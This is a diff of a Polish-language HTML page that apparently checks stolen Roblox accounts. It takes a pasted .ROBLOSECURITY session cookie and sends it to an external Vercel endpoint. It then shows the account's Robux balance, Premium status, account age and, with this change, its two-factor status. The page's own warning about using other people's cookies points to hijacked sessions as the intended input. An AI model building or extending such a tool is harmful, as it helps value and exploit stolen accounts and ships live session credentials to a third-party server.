@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox – nazwa z .ROBLOSECURITY + wiek konta</title>
+  <title>Roblox – dane z .ROBLOSECURITY</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -42,7 +42,7 @@
       background: #1a1a1a;
       border: 1px solid #444;
       border-radius: 8px;
-      min-height: 120px;
+      min-height: 160px;
       line-height: 1.6;
     }
     .error { color: #ff4d4d; }
@@ -53,16 +53,16 @@
 </head>
 <body>
 
-<h2>Pobierz dane konta Roblox z cookie</h2>
+<h2>Pobierz dane konta Roblox z cookie .ROBLOSECURITY</h2>
 
 <p style="color:#ffcc00; font-weight:bold;">
-  <strong>OSTRZEŻENIE:</strong> używanie cudzych cookie jest niezgodne z regulaminem Roblox i może skutkować banem
+  <strong>OSTRZEŻENIE:</strong> używanie cudzych cookie jest niezgodne z regulaminem Roblox i może skutkować permanentnym banem konta
 </p>
 
-<textarea id="cookie" placeholder="Wklej tutaj sam ciąg .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
+<textarea id="cookie" placeholder="Wklej tutaj wartość .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
 
 <br>
-<button onclick="sprawdz()">Sprawdź</button>
+<button onclick="sprawdz()">Sprawdź konto</button>
 
 <div id="result"></div>
 
@@ -73,11 +73,11 @@ async function sprawdz() {
   result.innerHTML = '';
 
   if (cookieVal.length < 200) {
-    result.innerHTML = '<span class="error">Wklej poprawne cookie! (zbyt krótki ciąg)</span>';
+    result.innerHTML = '<span class="error">Cookie wygląda na za krótkie / nieprawidłowe</span>';
     return;
   }
 
-  result.innerHTML = '<i>Proszę czekać... trwa weryfikacja</i>';
+  result.innerHTML = '<i>Trwa sprawdzanie... proszę czekać</i>';
 
   try {
     const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {
@@ -95,43 +95,46 @@ async function sprawdz() {
 
     if (json.success) {
       const creationDate = json.created !== 'nie udało się pobrać'
-        ? new Date(json.created).toLocaleDateString('pl-PL', {
-            day: '2-digit',
-            month: '2-digit',
-            year: 'numeric'
-          })
+        ? new Date(json.created).toLocaleDateString('pl-PL', { day: '2-digit', month: '2-digit', year: 'numeric' })
         : '—';
 
+      let twoFAColor = '#ffcc00';
+      if (json.twoFAStatus === 'Włączone') twoFAColor = '#00ff9d';
+      if (json.twoFAStatus.includes('Błąd') || json.twoFAStatus === 'Nie udało się sprawdzić') twoFAColor = '#ff4d4d';
+
       result.innerHTML = `
-        <span class="success">Zalogowano pomyślnie!</span><br><br>
-        
+        <span class="success">Pomyślnie zweryfikowano!</span><br><br>
+
         <b>Nazwa użytkownika:</b> ${json.username}<br>
         <b>Display Name:</b> ${json.displayName}<br>
         <b>User ID:</b> ${json.userId}<br>
-        
-        <b>Roblox Premium:</b> 
-        <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
-          ${json.hasPremium ? 'TAK ✓' : 'NIE ✗'}
-        </span><br>
-        
-        <b>Robux na koncie:</b> 
-        <span style="color: #ffcc00; font-weight: bold;">
-          ${json.robux.toLocaleString('pl-PL')} Robux
-        </span><br>
-        
-        <b>Wiek konta:</b> 
-        <span style="color: #ffcc00; font-weight: bold;">
-          ${json.accountAgeDays} dni
-        </span><br>
-        
-        <b>Data założenia:</b> 
-        <span style="color: #aaa;">
-          ${creationDate}
-        </span>
+
+        <b>Roblox Premium:</b>
+          <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
+            ${json.hasPremium ? 'TAK ✓' : 'NIE ✗'}
+          </span><br>
+
+        <b>Robux na koncie:</b>
+          <span style="color: #ffcc00; font-weight: bold;">
+            ${json.robux.toLocaleString('pl-PL')} Robux
+          </span><br>
+
+        <b>Wiek konta:</b>
+          <span style="color: #ffcc00; font-weight: bold;">
+            ${json.accountAgeDays} dni
+          </span><br>
+
+        <b>Data założenia:</b> ${creationDate}
         ${json.created !== 'nie udało się pobrać' ? `<small> (${json.created.split('T')[0]})</small>` : ''}<br>
+
+        <b>2-Step Verification (2FA):</b>
+          <span style="color: ${twoFAColor}; font-weight: bold;">
+            ${json.twoFAStatus}
+          </span>
+          ${json.twoFAType ? `<br><small>Typ: ${json.twoFAType}</small>` : ''}<br>
       `;
     } else {
-      result.innerHTML = '<span class="error">Nieznana odpowiedź serwera</span>';
+      result.innerHTML = '<span class="error">Nieznany format odpowiedzi serwera</span>';
     }
   } catch (e) {
     result.innerHTML = `<span class="error">Błąd połączenia: ${e.message}</span>`;
